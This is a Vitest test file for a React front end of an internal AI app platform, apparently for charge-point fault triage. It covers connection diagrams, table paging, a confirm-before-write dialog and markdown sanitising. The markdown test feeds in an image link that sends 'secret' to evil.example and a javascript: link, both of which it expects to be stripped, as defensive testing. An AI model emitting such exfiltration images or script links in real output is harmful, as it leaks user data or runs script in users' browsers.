import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import type { ReactNode } from "react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { DataTable } from "../src/components/DataTable";
import { Markdown } from "../src/components/Markdown";
import { WiringPlate } from "../src/components/WiringPlate";
import { AppSurface } from "../src/features/runner/AppSurface";
import type { InvokeResult } from "../src/lib/api";
import type { UiSpec } from "../src/lib/types";

const wrap = (ui: ReactNode) =>
  render(<QueryClientProvider client={new QueryClient({ defaultOptions: { queries: { retry: false } } })}>{ui}</QueryClientProvider>);

afterEach(() => vi.unstubAllGlobals());

describe("the wiring plate", () => {
  const reach = {
    audience: { kind: "groups" as const, groups: ["EDRI-Ops"] },
    connectors: [
      { id: "chargepoints.status", title: "Charge point status", access: "read" as const, classification: "internal", external: false },
      { id: "sessions.revenue", title: "Charging revenue", access: "read" as const, classification: "confidential", external: false },
      { id: "tickets.comment", title: "Comment on a ticket", access: "write" as const, classification: "internal", external: false },
    ],
    models: [{ alias: "smart", maxTokensPerCall: 1200 }],
    collections: [{ name: "notes", scope: "private" as const, classification: "internal" as const, retentionDays: 30 }],
  };

  it("describes every connection in words, not only in colour", () => {
    wrap(<WiringPlate name="Fault triage" reach={reach} />);
    const img = screen.getByRole("img");
    const desc = img.querySelector("desc")?.textContent ?? "";
    expect(desc).toContain("Charge point status: reads internal data");
    expect(desc).toContain("Charging revenue: reads confidential data");
    expect(desc).toContain("Comment on a ticket: changes data after you confirm");
    expect(desc).toContain("notes”: kept per person, 30 days");
    expect(screen.getByText(/Open to EDRI-Ops/)).toBeInTheDocument();
  });

  it("marks what a new version adds and removes", () => {
    const previous = { ...reach, connectors: [reach.connectors[0] as (typeof reach.connectors)[number]], collections: [] };
    const next = { ...reach, connectors: reach.connectors.slice(1), collections: [] };
    wrap(<WiringPlate name="Fault triage" reach={next} previous={previous} />);
    const desc = screen.getByRole("img").querySelector("desc")?.textContent ?? "";
    expect(desc).toContain("Charging revenue: reads confidential data (new)");
    expect(desc).toContain("Charge point status: removed in this version");
  });

  it("says so when an app reaches nothing", () => {
    wrap(<WiringPlate name="Calculator" reach={{ ...reach, connectors: [], models: [], collections: [] }} />);
    expect(screen.getByRole("img").querySelector("desc")?.textContent).toContain("No connections");
  });
});

describe("markdown from apps and models", () => {
  it("drops images and raw HTML and keeps only safe links", () => {
    const { container } = render(
      <Markdown
        text={"Hi ![x](https://evil.example/?d=secret) <b>bold</b> [ok](https://eon.com) [bad](javascript:alert(1)) [rel](/apps)"}
      />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    const hrefs = [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));
    expect(hrefs).toEqual(["https://eon.com", "/apps"]);
  });
});

describe("tables", () => {
  it("shows the first rows and the rest on request", async () => {
    const rows = Array.from({ length: 30 }, (_, i) => ({ id: `CP${i}`, kw: i }));
    render(
      <DataTable
        rows={rows}
        columns={[
          { key: "id", label: "Id" },
          { key: "kw", label: "kW", format: "number" },
        ]}
      />,
    );
    expect(screen.getAllByRole("row")).toHaveLength(26);
    await userEvent.click(screen.getByRole("button", { name: "Show all 30 rows" }));
    expect(screen.getAllByRole("row")).toHaveLength(31);
  });
});

const ui: UiSpec = {
  pages: [
    {
      id: "main",
      title: "Main",
      blocks: [
        {
          type: "form",
          handler: "note",
          title: "Add a note",
          fields: [{ name: "ticketId", label: "Ticket", kind: "text", required: true }],
          submitLabel: "Add note",
          result: [{ type: "markdown", path: "summary" }],
        },
        { type: "chat", handler: "ask", intro: "Ask about a charge point", suggestions: ["Why is it faulted?"] },
      ],
    },
  ],
};

describe("running an app", () => {
  it("holds a write until the person confirms, and sends nothing when they cancel", async () => {
    const invoke = vi.fn(
      async (): Promise<InvokeResult> => ({
        kind: "confirm",
        confirmation: {
          id: "c1",
          summary: "Add a note to T-1",
          connector: "tickets.comment",
          title: "Comment on a ticket",
          args: { ticketId: "T-1" },
          expiresAt: new Date().toISOString(),
        },
        usage: { tokensIn: 0, tokensOut: 0, costMicroEur: 0, cacheHits: 0 },
      }),
    );
    const fetch = vi.fn(async () => new Response(JSON.stringify({ cancelled: true }), { status: 200 }));
    vi.stubGlobal("fetch", fetch);
    wrap(<AppSurface ui={ui} scope="t" invoke={invoke} />);
    await userEvent.type(screen.getByLabelText("Ticket", { exact: true }), "T-1");
    await userEvent.click(screen.getByRole("button", { name: "Add note" }));
    const dialog = await screen.findByRole("alertdialog");
    expect(dialog).toHaveTextContent("Add a note to T-1");
    expect(dialog).toHaveTextContent("until you confirm");
    expect(screen.getByRole("button", { name: "Cancel" })).toHaveFocus();
    await userEvent.click(screen.getByRole("button", { name: "Cancel" }));
    await waitFor(() => expect(screen.queryByRole("alertdialog")).toBeNull());
    expect(fetch).toHaveBeenCalledWith("/v1/confirmations/c1", expect.objectContaining({ body: JSON.stringify({ decision: "cancel" }) }));
    expect(screen.getByText("Cancelled. Nothing was changed.")).toBeInTheDocument();
  });

  it("confirms with the header the API requires", async () => {
    const invoke = vi.fn(
      async (): Promise<InvokeResult> => ({
        kind: "confirm",
        confirmation: {
          id: "c2",
          summary: "Add a note to T-2",
          connector: "tickets.comment",
          title: "Comment on a ticket",
          args: {},
          expiresAt: new Date().toISOString(),
        },
        usage: { tokensIn: 0, tokensOut: 0, costMicroEur: 0, cacheHits: 0 },
      }),
    );
    const fetch = vi.fn(async () => new Response(JSON.stringify({ done: true }), { status: 200 }));
    vi.stubGlobal("fetch", fetch);
    wrap(<AppSurface ui={ui} scope="t" invoke={invoke} />);
    await userEvent.type(screen.getByLabelText("Ticket", { exact: true }), "T-2");
    await userEvent.click(screen.getByRole("button", { name: "Add note" }));
    await userEvent.click(await screen.findByRole("button", { name: "Confirm and send" }));
    await screen.findByText("Done: Add a note to T-2.");
    const init = (fetch.mock.calls[0] as unknown as [string, RequestInit])[1];
    expect((init.headers as Record<string, string>)["x-foundry-request"]).toBe("1");
  });

  it("streams an answer into the conversation and sends the history with the next question", async () => {
    async function* words() {
      yield "Residual ";
      yield "current trip.";
    }
    const invoke = vi
      .fn<(h: string, i: unknown) => Promise<InvokeResult>>()
      .mockResolvedValueOnce({ kind: "stream", stream: words() })
      .mockResolvedValueOnce({
        kind: "value",
        value: { reply: "Check the RCD.", sources: ["docs.search", "docs.search"] },
        usage: { tokensIn: 0, tokensOut: 0, costMicroEur: 0, cacheHits: 0 },
        ms: 3,
      });
    wrap(<AppSurface ui={ui} scope="t" invoke={invoke} />);
    await userEvent.click(screen.getByRole("button", { name: "Why is it faulted?" }));
    await screen.findByText("Residual current trip.");
    const box = screen.getByLabelText("Message");
    await userEvent.type(box, "And then?{Enter}");
    await screen.findByText("Check the RCD.");
    expect(invoke.mock.calls[1]?.[1]).toEqual({
      message: "And then?",
      history: [
        { role: "user", content: "Why is it faulted?" },
        { role: "assistant", content: "Residual current trip." },
      ],
    });
    expect(screen.getAllByText("docs.search")).toHaveLength(1);
  });

  it("shows a failed question with a way to send it again", async () => {
    const { ApiError } = await import("../src/lib/api");
    const invoke = vi.fn(async (): Promise<InvokeResult> => {
      throw new ApiError(429, "BUDGET_EXHAUSTED", "the app's budget for today is used up");
    });
    wrap(<AppSurface ui={ui} scope="t" invoke={invoke} />);
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "Why is it faulted?" }));
    });
    expect(await screen.findByRole("alert")).toHaveTextContent("BUDGET_EXHAUSTED");
    expect(screen.getByRole("button", { name: "Send again" })).toBeInTheDocument();
  });
});
